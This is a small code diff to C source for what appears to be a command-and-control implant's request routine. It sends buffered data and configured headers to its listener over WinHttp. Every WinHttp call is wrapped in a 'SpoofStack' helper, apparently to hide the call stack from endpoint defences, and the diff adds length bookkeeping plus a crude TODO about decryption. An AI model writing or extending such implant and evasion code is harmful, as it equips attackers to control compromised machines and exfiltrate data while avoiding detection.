@@ -64,12 +64,16 @@ BOOL PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response)
 	
 	
 	int index = 0;
+	ULONG TotalLength = 0;
 	while (agent->config->listenerConfig->Headers[index] != NULL) {
 		if (!SpoofStack(agent->apis->pWinHttpAddRequestHeaders, 4, hRequest, agent->config->listenerConfig->Headers[index], -1, WINHTTP_ADDREQ_FLAG_ADD)) {
 			printf("[!] Failure to add request headers [%ls]\n", agent->config->listenerConfig->Headers[index]);
 		}
+		TotalLength += StringLengthW(agent->config->listenerConfig->Headers[index]);
 		index++;
 	}
+	TotalLength += BufferLength;
+	//TODO maybe change the total length to stop getting cucked by decryption. we'll see.
 	if (SpoofStack(agent->apis->pWinHttpSendRequest,7, hRequest, NULL, 0, (LPVOID)Buffer, BufferLength, BufferLength, 0))
 	{
 		if (SpoofStack(agent->apis->pWinHttpReceiveResponse, 2, hRequest, NULL))
